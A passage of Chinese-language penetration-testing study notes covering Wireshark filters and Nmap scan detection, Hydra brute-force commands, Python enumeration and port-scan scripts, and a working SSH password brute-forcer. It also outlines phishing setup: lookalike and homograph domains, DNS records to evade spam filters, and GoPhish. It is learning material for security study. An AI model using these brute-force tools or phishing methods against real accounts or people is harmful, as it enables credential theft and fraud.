协议百分比以树状视图查看结果。因此，分析师可以查看 HTTP 服务的总体使用情况，包括请求和响应代码以及原始请求。 您可以使用 <strong>“统计信息 --&gt; HTTP”</strong> 菜单查看此信息。</p><p><strong>过滤器语法</strong></p><p>Wireshark 中有两种类型的过滤器。虽然两者都使用类似的语法，但它们的用途不同。让我们记住这两个类别之间的区别。</p><table><thead><tr><th><strong>捕获过滤器</strong></th><th>这种类型的过滤器用于仅保存流量的特定部分。它在捕获流量之前设置，并且在捕获期间不可更改。</th></tr></thead><tbody><tr><td><strong>显示过滤器</strong></td><td>这种类型的过滤器用于通过减少可见数据包的数量来调查数据包，并且可以在捕获过程中进行更改。</td></tr></tbody></table><blockquote><p>您不能将显示过滤器表达式用于捕获流量，反之亦然。</p></blockquote><p><strong>捕获过滤器语法</strong></p><p>这些过滤器使用字节偏移十六进制值和带有布尔运算符的掩码，乍一看很难理解/预测过滤器的用途。基本语法解释如下：</p><ul><li><strong>范围：</strong> host, net, port and portrange</li><li><strong>方向：</strong> src, dst, src or dst, src and dst,</li><li><strong>协议：</strong> ether、wlan、ip、ip6、arp、rarp、tcp 和 udp。</li><li><strong>捕获端口 80 流量的过滤器示例：</strong> <code>tcp port 80</code></li></ul><p>您可以从 <a href="https://www.wireshark.org/docs/man-pages/pcap-filter.html">这里</a> 和 <a href="https://gitlab.com/wireshark/wireshark/-/wikis/CaptureFilters#useful-filters">这里阅读有关捕获过滤器语法的更多信息。 </a>**“捕获 --&gt; 捕获过滤器”**菜单下提供了快速参考。</p><p><strong>显示过滤器语法</strong></p><p>Wireshark最强大的功能，支持3000种协议，并允许在协议细分下进行数据包级别的搜索。官方的“<a href="https://www.wireshark.org/docs/dfref/">显示过滤器参考</a>”提供了所有支持的协议细分供过滤。</p><ul><li><strong>捕获端口 80 流量的过滤器示例：</strong> <code>tcp.port == 80</code></li></ul><p>Wireshark 有一个内置选项（显示过滤器表达式），其中存储了所有支持的协议结构，以帮助分析人员创建显示过滤器。我们稍后会介绍“显示过滤器表达式”菜单。现在让我们了解显示过滤器操作的基础知识。在**“分析 --&gt; 显示过滤器”**菜单下有一个快速参考。</p><p><strong>比较运算符</strong></p><table><thead><tr><th><strong>符号</strong></th><th><strong>例子</strong></th><th><strong>例子</strong></th></tr></thead><tbody><tr><td>==</td><td>平等的</td><td><code>ip.src == 10.10.10.100</code></td></tr><tr><td>!=</td><td>不等于</td><td><code>ip.src != 10.10.10.100</code></td></tr><tr><td>&gt;</td><td>大于</td><td><code>ip.ttl &gt; 250</code></td></tr><tr><td>&lt;</td><td>少于</td><td><code>ip.ttl &lt; 10</code></td></tr><tr><td>&gt;=</td><td>大于或等于</td><td><code>ip.ttl &gt;= 0xFA</code></td></tr><tr><td>&lt;=</td><td>小于或等于</td><td><code>ip.ttl &lt;= 0xA</code></td></tr></tbody></table><blockquote><p>Wireshark 支持使用十进制和十六进制值进行过滤。</p></blockquote><p><strong>逻辑表达式</strong></p><p>Wireshark 支持布尔语法。您也可以使用逻辑运算符创建显示过滤器。</p><table><thead><tr><th><strong>符号</strong></th><th><strong>描述</strong></th><th><strong>例子</strong></th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>逻辑与</td><td><code>(ip.src == 10.10.10.100) AND (ip.src == 10.10.10.111)</code></td></tr><tr><td>||</td><td>逻辑或</td><td><code>(ip.src == 10.10.10.100) OR (ip.src == 10.10.10.111)</code></td></tr><tr><td>！</td><td>逻辑非</td><td><code>!(ip.src == 10.10.10.222)</code>**注意：**不推荐 使用<code>!=value</code> ；使用它可能会产生不一致的结果。使用<code>!(value)</code> 建议采用这种风格以获得更一致的结果。</td></tr></tbody></table><p><strong>数据包过滤器工具栏</strong></p><p>是创建和应用显示过滤器的地方。</p><ul><li>数据包过滤器以小写定义。</li><li>数据包过滤器具有自动完成功能，可以分解协议细节，每个细节都用“点”表示。</li><li>数据包过滤器有三种颜色表示，绿色：有效过滤器；红色：无效过滤器；黄色：警告过滤器。此过滤器有效，但不可靠，建议使用有效的过滤器进行更换。</li></ul><p><strong>常见数据包过滤器</strong></p><ul><li>IP筛选器</li></ul><table><thead><tr><th><strong>筛选</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ip</code></td><td>显示所有 IP 数据包。</td></tr><tr><td><code>ip.addr == 10.10.10.111</code></td><td>显示所有包含 IP 地址 10.10.10.111 的数据包。</td></tr><tr><td><code>ip.addr == 10.10.10.0/24</code></td><td>显示所有包含来自 10.10.10.0/24 子网的 IP 地址的数据包。</td></tr><tr><td><code>ip.src == 10.10.10.111</code></td><td>显示所有来自 10.10.10.111 的数据包</td></tr><tr><td><code>ip.dst == 10.10.10.111</code></td><td>显示所有发送到 10.10.10.111 的数据包</td></tr></tbody></table><blockquote><p>ip.addr 过滤流量时不考虑数据包方向。ip.src/ip.dst 根据数据包方向过滤数据包。</p></blockquote><ul><li>TCP和UDP过滤器</li></ul><p>根据数据包中的协议级信息（OSI 模型的传输层）过滤流量。这些过滤器过滤传输协议级信息，如源端口和目标端口、序列号、确认号、窗口大小、时间戳、标志、长度和协议错误。</p><table><thead><tr><th><strong>筛选</strong></th><th><strong>描述</strong></th><th><strong>筛选</strong></th><th><strong>表达</strong></th></tr></thead><tbody><tr><td><code>tcp.port == 80</code></td><td>显示端口 80 的 所有TCP数据包</td><td><code>udp.port == 53</code></td><td>显示端口 53 的所有UDP数据包</td></tr><tr><td><code>tcp.srcport == 1234</code></td><td>显示来自端口 1234 的所有TCP数据包</td><td><code>udp.srcport == 1234</code></td><td>显示来自端口 1234 的所有UDP数据包</td></tr><tr><td><code>tcp.dstport == 80</code></td><td>显示发送到端口 80 的所有TCP数据包</td><td><code>udp.dstport == 5353</code></td><td>显示发送到端口 5353 的所有UDP数据包</td></tr></tbody></table><ul><li>应用程序级协议过滤器 | HTTP和DNS</li></ul><table><thead><tr><th><strong>筛选</strong></th><th><strong>描述</strong></th><th><strong>筛选</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>http</code></td><td>显示所有HTTP数据包</td><td><code>dns</code></td><td>显示所有DNS数据包</td></tr><tr><td><code>http.response.code == 200</code></td><td>显示所有带有 HTTP 响应代码“200”的数据包</td><td><code>dns.flags.response == 0</code></td><td>显示所有DNS请求</td></tr><tr><td><code>http.request.method == &quot;GET&quot;</code></td><td>显示所有HTTP GET 请求</td><td><code>dns.flags.response == 1</code></td><td>显示所有DNS响应</td></tr><tr><td><code>http.request.method == &quot;POST&quot;</code></td><td>显示所有HTTP POST 请求</td><td><code>dns.1</code></td><td>显示所有 DNS“A”记录</td></tr></tbody></table><p>Wireshark 有一个内置选项（显示过滤器表达式），可存储所有支持的协议结构，以帮助分析师创建显示过滤器。当分析师无法回忆起特定协议所需的过滤器或不确定过滤器的可分配值时，显示过滤器表达式菜单提供了一个易于使用的显示过滤器构建器指南。它位于 <strong>“分析 --&gt; 显示过滤器表达式”</strong> 菜单下。</p><p>不可能记住每个协议的显示过滤器的所有细节。每个协议可以有不同的字段，并且可以接受各种类型的值。显示过滤器表达式菜单显示所有协议字段、接受的值类型（整数或字符串）和预定义值（如果有）。请注意，掌握创建过滤器和学习协议过滤器字段需要时间和练习。</p><p><strong>高级过滤</strong></p><p>关注感兴趣事件的特定数据包详细信息</p><ul><li>关键字：<strong>contains</strong></li></ul><p>搜索数据包内的值。它区分大小写，并通过关注特定字段提供与“查找”选项类似的功能。</p><p>例子：列出所有数据包的“服务器”字段包含“Apache”关键字的 HTTP 数据包。</p><p><code>http.server contains &quot;Apache&quot;</code></p><ul><li><strong>matches</strong></li></ul><p>搜索正则表达式的模式。它不区分大小写，复杂查询有一定的误差范围。</p><p>例子： 查找所有 .php 和 .html 页面（列出所有 数据包的“主机”字段与关键字“.php”或“.html”匹配的HTTP数据包。）</p><p><code>http.host matches &quot;\.(php|html)&quot;</code></p><ul><li><strong>in</strong></li></ul><p>搜索特定范围/范围内的值或字段。</p><p>例子：列出所有数据包“端口”字段的值为 80、443 或 8080 的 TCP 数据包。</p><p><code>tcp.port in &#123;80 443 8080&#125;</code></p><ul><li><strong>upper</strong></li></ul><p>将字符串值转换为大写。</p><p>例子：将所有 HTTP 数据包的“服务器”字段转换为大写，并列出包含“APACHE”关键字的数据包。</p><p><code>upper(http.server) contains &quot;APACHE&quot;</code></p><ul><li><strong>lower</strong></li></ul><p>将字符串值转换为小写。</p><p><code>lower(http.server) contains &quot;apache&quot;</code></p><ul><li><strong>string</strong></li></ul><p>将非字符串值转换为字符串。</p><p>查找所有具有奇数的帧。<code>string(frame.number) matches &quot;[13579]$&quot;</code></p><blockquote><p>创建的过滤器可以保存为书签和按钮以供日后使用</p></blockquote><h3 id="wireshark流量分析">WireShark流量分析</h3><h4 id="nmap扫描">Nmap扫描</h4><p>最常用的网络扫描工具之一，识别最常见的Nmap扫描类型。</p><p><strong>TCP标志</strong></p><table><thead><tr><th><strong>笔记</strong></th><th><strong>Wireshark 过滤器</strong></th></tr></thead><tbody><tr><td>全局搜索</td><td><code>tcp</code>、<code>udp</code></td></tr><tr><td>仅 SYN 标志。<br />SYN 标志已设置。其余位不重要。</td><td><code>tcp.flags == 2</code><br /><code>tcp.flags.syn == 1</code></td></tr><tr><td>仅 ACK 标志。<br />ACK 标志已设置。其余位不重要。</td><td><code>tcp.flags == 16</code><br /><code>tcp.flags.ack == 1</code></td></tr><tr><td>仅 SYN、ACK 标志。<br />SYN 和 ACK 已设置。其余位不重要。</td><td><code>tcp.flags == 18</code><br /><code>(tcp.flags.syn == 1) and (tcp.flags.ack == 1)</code></td></tr><tr><td>仅 RST 标志。<br />RST 标志已设置。其余位不重要。</td><td><code>tcp.flags == 4</code><br /><code>tcp.flags.reset == 1</code></td></tr><tr><td>只有 RST、ACK 标志。<br />RST 和 ACK 已设置。其余位不重要。</td><td><code>tcp.flags == 20</code><br /><code>(tcp.flags.reset == 1) and (tcp.flags.ack == 1)</code></td></tr><tr><td>仅 FIN 标志<br />FIN 标志已设置。其余位不重要。</td><td><code>tcp.flags == 1</code><br /><code>tcp.flags.fin == 1</code></td></tr></tbody></table><p><strong>TCP扫描</strong></p><ul><li>依赖于三次握手（需要完成握手过程）。</li><li>通常通过<code>nmap -sT</code> 命令进行。</li><li>由非特权用户使用（非 root 用户的唯一选项）。</li><li>由于协议的性质，请求需要一些数据，因此窗口大小通常大于 1024 字节。</li></ul><p>端口打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYN --&gt;</span><br><span class="line">&lt;-- SYN,ACK</span><br><span class="line">ACK --&gt;</span><br><span class="line">RST,ACK --&gt;</span><br></pre></td></tr></table></figure><p>端口关闭：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYN --&gt;</span><br><span class="line">&lt;-- RST,ACK</span><br></pre></td></tr></table></figure><p>在大型文件中不易发现，需要使用通用过滤器来查看初始异常模式，然后更容易将注意力集中在特定的流量点上。给定的过滤器显示捕获文件中的TCP Connect 扫描模式。</p><p><code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &gt; 1024</code></p><p><strong>SYN扫描</strong></p><ul><li>不依赖于三次握手（不需要完成握手过程）。</li><li>通常通过 <code>nmap -sS</code> 命令进行。</li><li>由特权用户使用。</li><li>通常大小小于或等于 1024 字节，因为请求尚未完成并且不希望接收数据。</li></ul><p>打开端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYN --&gt;</span><br><span class="line">&lt;-- SYN,ACK</span><br><span class="line">RST --&gt;</span><br></pre></td></tr></table></figure><p>关闭端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYN --&gt;</span><br><span class="line">&lt;-- RST,ACK</span><br></pre></td></tr></table></figure><p>如下过滤器 在捕获文件中显示TCP SYN 扫描模式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &lt;= 1024</span><br></pre></td></tr></table></figure><p><strong>UDP扫描</strong></p><ul><li>不需要握手过程</li><li>没有打开端口的提示</li><li>关闭端口的 ICMP 错误消息</li><li>通常通过 <code>nmap -sU</code> 命令进行。</li></ul><p>打开端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDP packet --&gt;</span><br></pre></td></tr></table></figure><p>关闭端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UDP packet --&gt;</span><br><span class="line">ICMP Type 3, Code 3 message.(Destination unreachable, port unreachable)</span><br></pre></td></tr></table></figure><p>过滤器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmp.type==3 and icmp.code==3 </span><br></pre></td></tr></table></figure><h2 id="工具-hydra">工具-Hydra</h2><p>一款暴力在线密码破解程序，一种快速系统登录密码“破解”工具。</p><p>根据其<a href="https://github.com/vanhauser-thc/thc-hydra">官方存储库</a>，Hydra 支持（即有能力）暴力破解以下协议：“Asterisk、AFP、Cisco AAA、Cisco auth、Cisco enable、CVS、Firebird、FTP、HTTP -FORM-GET、HTTP -FORM-POST、HTTP -GET、 HTTP -HEAD、HTTP -POST、HTTP -PROXY、HTTPS-FORM-GET、HTTPS-FORM-POST、HTTPS-GET、HTTPS-HEAD、HTTPS-POST、HTTP -Proxy、ICQ、IMAP、IRC、LDAP、MEMCACHED、MONGODB、MS-SQL、MYSQL、NCP、NNTP、Oracle Listener、Oracle SID、Oracle、PC-Anywhere、PCNFS、POP3、POSTGRES、Radmin、RDP、Rexec、Rlogin、Rsh、RTSP、SAP/R3、SIP、SMB、SMTP 、 SMTP Enum、SNMP v1+v2+v3、SOCKS5、SSH（v1 和 v2）、SSHKEY、Subversion、TeamSpeak（TS2）、Telnet、VMware-Auth、VNC 和 XMPP。”</p><p>我们传递给 Hydra 的选项取决于我们要攻击的服务（协议），一般命令如下</p><p><code>hydra -l &lt;username&gt; -P &lt;wordlist.txt&gt; &lt;server&gt; &lt;service&gt;</code></p><p>如<strong>ssh</strong></p><p><code>hydra -l &lt;username&gt; -P &lt;full path to pass&gt; 10.10.223.175 -t 4 ssh</code></p><blockquote><p><code>-t</code>设置要生成的线程数</p></blockquote><p><strong>hydra</strong>也可用来暴力破解Web表单，必须知道它发出的是哪种类型的请求；通常使用 GET 或 POST 方法。例如</p><p><code>sudo hydra &lt;username&gt; &lt;wordlist&gt; 10.10.223.175 http-post-form &quot;&lt;path&gt;:&lt;login_credentials&gt;:&lt;invalid_response&gt;&quot;</code></p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td><code>-l</code></td><td>（Web 表单）登录的用户名</td></tr><tr><td><code>-P</code></td><td>要使用的密码列表</td></tr><tr><td><code>http-post-form</code></td><td>表单类型为 POST</td></tr><tr><td><code>&lt;path&gt;</code></td><td>登录页面 URL，例如<code>login.php</code></td></tr><tr><td><code>&lt;login_credentials&gt;</code></td><td>用于登录的用户名和密码，例如， <code>username=^USER^&amp;password=^PASS^</code></td></tr><tr><td><code>&lt;invalid_response&gt;</code></td><td>登录失败时的部分响应</td></tr><tr><td><code>-V</code></td><td>每次尝试的详细输出</td></tr></tbody></table><p>下面是一个更具体的Hydra命令示例，用于强制执行 POST 登录表单：</p><p><code>hydra -l &lt;username&gt; -P &lt;wordlist&gt; 10.10.223.175 http-post-form &quot;/:username=^USER^&amp;password=^PASS^:F=incorrect&quot; -V</code></p><blockquote><p>指定的用户名将替换<code>^USER^</code>，提供的密码将取代<code>^PASS^</code>，<code>F=incorrect</code>是登录失败时服务器回复中出现的字符串</p></blockquote><h2 id="python脚本">python脚本</h2><p>利用好脚本语言自动化完成渗透任务，python语法不多赘述</p><blockquote><p>py2exe工具可用于将 Python 脚本转换为 Windows 可执行文件</p></blockquote><p>常见场景练习：</p><ul><li><strong>子域名枚举</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sub_list = <span class="built_in">open</span>(<span class="string">&quot;wordlist.txt&quot;</span>).read()</span><br><span class="line">subdoms = sub_list.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sub <span class="keyword">in</span> subdoms:</span><br><span class="line">    sub_domains = <span class="string">f&quot;http://<span class="subst">&#123;sub&#125;</span>.<span class="subst">&#123;sys.argv[<span class="number">1</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(sub_domains)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.ConnectionError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Valid domain: &quot;</span>,sub_domains)</span><br></pre></td></tr></table></figure><ul><li><strong>目录枚举</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sub_list = <span class="built_in">open</span>(<span class="string">&quot;wordlist.txt&quot;</span>).read()</span><br><span class="line">directories = sub_list.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> directories:</span><br><span class="line">    dir_enum = <span class="string">f&quot;http://<span class="subst">&#123;sys.argv[<span class="number">1</span>]&#125;</span>/<span class="subst">&#123;<span class="built_in">dir</span>&#125;</span>.html&quot;</span></span><br><span class="line">    r = requests.get(dir_enum)</span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">404</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Valid directory:&quot;</span> ,dir_enum)</span><br></pre></td></tr></table></figure><ul><li><strong>端口扫描</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> pyfiglet <span class="comment"># 用于艺术字😋</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ascii_banner = pyfiglet.figlet_format(<span class="string">&quot;Port Scanner&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ascii_banner)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.1.6&#x27;</span> </span><br><span class="line"><span class="comment"># ip = socket.gethostbyname(host)</span></span><br><span class="line">open_ports =[] </span><br><span class="line"></span><br><span class="line">ports = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65535</span>) <span class="comment"># 可修改为扫描常用端口</span></span><br><span class="line"><span class="comment"># ports = &#123; 21, 22, 23, 53, 80, 135, 443, 445&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">probe_port</span>(<span class="params">ip, port, result = <span class="number">1</span></span>): </span><br><span class="line">  <span class="keyword">try</span>: </span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">    sock.settimeout(<span class="number">0.5</span>) </span><br><span class="line">    r = sock.connect_ex((ip, port))   </span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>: </span><br><span class="line">      result = r </span><br><span class="line">    sock.close() </span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">    <span class="keyword">pass</span> </span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports: </span><br><span class="line">    sys.stdout.flush() </span><br><span class="line">    response = probe_port(ip, port) </span><br><span class="line">    <span class="keyword">if</span> response == <span class="number">0</span>: </span><br><span class="line">        open_ports.append(port) </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> open_ports: </span><br><span class="line">  <span class="built_in">print</span> (<span class="string">&quot;Open Ports are: &quot;</span>) </span><br><span class="line">  <span class="built_in">print</span> (<span class="built_in">sorted</span>(open_ports)) </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">  <span class="built_in">print</span> (<span class="string">&quot;Looks like no ports are open :(&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>文件下载</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://&lt;url&gt;/&lt;file_name&gt;&#x27;</span></span><br><span class="line">r = requests.get(url, allow_redirects=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;&lt;file_name&gt;&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(r.content)  </span><br></pre></td></tr></table></figure><p><strong>SSH破解</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">target = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&#x27;Please enter target IP address: &#x27;</span>))</span><br><span class="line">username = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&#x27;Please enter username to bruteforce: &#x27;</span>))</span><br><span class="line">password_file = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&#x27;Please enter location of the password file: &#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssh_connect</span>(<span class="params">password, code=<span class="number">0</span></span>):</span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(target, port=<span class="number">22</span>, username=username, password=password)</span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException:</span><br><span class="line">        code = <span class="number">1</span></span><br><span class="line">    ssh.close()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">        password = line.strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = ssh_connect(password)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response == <span class="number">0</span>:</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&#x27;password found: &#x27;</span>+ password)</span><br><span class="line">                 exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> response == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;no luck&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">input_file.close()</span><br></pre></td></tr></table></figure><h3 id="owasp十大漏洞">OWASP十大漏洞</h3><ul><li>访问控制失效</li><li>破解加密</li><li>注入</li><li>不安全的设计</li><li>安全配置错误</li><li>易受攻击和过时的组件</li><li>身份认证失效</li><li>软件和数据完整性故障</li><li>安全日志和监控失效</li><li>服务端请求伪造（SSRF）</li></ul><h3 id="网络钓鱼">网络钓鱼</h3><p>红队攻击的重要手段</p><p>准备：</p><ul><li><p>**域名：**注册一个看起来真实的域名或一个模仿其他域名身份的域名。</p><p>​具有一定历史的域名可能会让您的域名在垃圾邮件过滤器避免被过滤</p><p>​注册域名与您试图冒充的目标域名非常相似</p><p>​更换顶级域名以冒充</p><p>​IDN 同形异义词攻击</p><blockquote><p>例如，Unicode 字符 U+0430（西里尔文小写字母 a）看起来与英语中使用的 Unicode 字符 U+0061（拉丁文小写字母 a）相同</p></blockquote></li><li><p>**SSL/TLS 证书：**为您选择的域名创建 SSL/TLS 证书将为攻击增加额外的真实性。</p></li><li><p>**电子邮件服务器/帐户：**设置电子邮件服务器或向SMTP电子邮件提供商注册。</p></li><li><p>**DNS记录：**设置 DNS 记录（例如 SPF、DKIM、DMARC）将提高电子邮件的传递率，并确保它们进入收件箱而不是垃圾邮件文件夹。</p></li><li><p>**Web 服务器：**设置网络服务器或从公司购买网络托管服务来托管您的钓鱼网站。</p></li><li><p>**分析：**保存分析信息，跟踪已发送、打开或点击的电子邮件</p></li><li><p>自动化软件：</p><p>​<strong>GoPhish-（开源网络钓鱼框架）<a href="https://getgophish.com/">-getgophish.com</a></strong></p><blockquote><p><a href="https://www.cnblogs.com/tomyyyyy/p/15503208.html">教程</a></p></blockquote><p>​<strong>SET-（社会工程学工具包）<a href="https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/">-trustedsec.com</a></strong></p></li></ul><blockquote><p>在网络钓鱼活动中，通常会将 Microsoft Office 文档（通常是 Word、Excel 或 PowerPoint）作为附件包含在内。Office 文档可以包含宏；可能导致恶意软件安装到受害者的计算机上或重新连接到攻击者的网络并允许攻击者控制受害者的计算机。</p></blockquote><blockquote><p>利用浏览器漏洞，例如CVE -2021-40444](<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a>)</p></blockquote><h3 id="windows安全">Windows安全</h3><h4 id="powershell">PowerShell</h4><p>使用.NET框架构建的Windows脚本语言和shell环境，</p><p>这也允许 Powershell 直接从其 shell 执行 .NET 函数。大多数 Powershell 命令（称为<em>cmdlet）都是用 .NET 编写的。与其他脚本语言和 shell 环境不同，这些**cmdlet</em>的输出 是对象 - 这使得 Powershell 在某种程度上是面向对象的。</p><p><em>这也意味着运行cmdlet</em>允许您对输出对象执行操作（这使得将输出从一个<em>cmdlet</em>传递 到另一个 cmdlet 变得很方便）。cmdlet 的正常格式使用<strong>动词-名词</strong>表示；例如， 列出命令的<em>cmdlet称为</em><code>Get-Command</code></p><ul><li><strong>常用命令</strong></li></ul><p><code>Get-Help</code></p><p>显示有关*cmdlet 的信息。*要获取特定命令的帮助，请运行以下命令：</p><p><code>Get-Help 